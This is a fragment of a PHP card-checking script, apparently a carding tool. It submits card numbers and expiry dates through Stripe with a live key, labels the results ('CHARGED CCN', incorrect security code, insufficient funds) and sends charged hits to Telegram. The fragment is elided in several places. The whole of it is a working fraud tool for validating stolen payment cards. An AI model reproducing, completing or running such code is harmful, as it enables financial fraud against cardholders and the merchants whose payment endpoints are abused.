...
# [ 𝙋𝙊𝙎𝙏𝙁𝙄𝙀𝙇𝘿𝙎 ]    
 curl_setopt($ch, CURLOPT_POSTFIELDS, "type=card&card[number]=$cc&card[exp_month]=$mes&card[exp_year]=$ano&guid=$guid&muid=$muid&sid=$sid&key=$pk_live");
...
if (strpos($Payment, '"result":"success"') !== false) { 
    ...
    echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [CHARGED CCN] - ['.$ip.'] - [AMOUNT:'.$price1.'] - [<a href="' . $receiptUrl . '" target="_blank">RECEIPT</a> <a href="' . $hostname1 . '" target="_blank">SITE</a> '.$lineNumber.']<br>                    
    ...
    <br>';
            ...
            $telegramMessage = "[#CHARGED] - $lista [STRIPE CCN CHARGED]
            \n[$price1]
            \n[$hostname1]\n";
 ...
 echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [Your Card Security Code is Incorrect] - ['.$ip.'] - [AMOUNT:'.$price1.'] - [<a href="' . $hostname1 . '" target="_blank">SITE</a> '.$lineNumber.']<br>                    
  ...
  echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [Your Card Security Code is Incorrect] - ['.$ip.'] - [AMOUNT:'.$price1.'] - [<a href="' . $hostname1 . '" target="_blank">SITE</a> '.$lineNumber.']<br>                    
   ...
   echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [Your Card Security Code is Incorrect] - ['.$ip.'] - [AMOUNT:'.$price1.'] - [<a href="' . $hostname1 . '" target="_blank">SITE</a> '.$lineNumber.']<br>                    
    ...
    echo '<span style="color: #ffffffff; padding: 8px;"> #CCN [Your Card Has Insufficient Funds] - ['.$ip.'] - [AMOUNT:'.$price1.'] - [<a href="' . $hostname1 . '" target="_blank">SITE</a> '.$lineNumber.']<br>                    
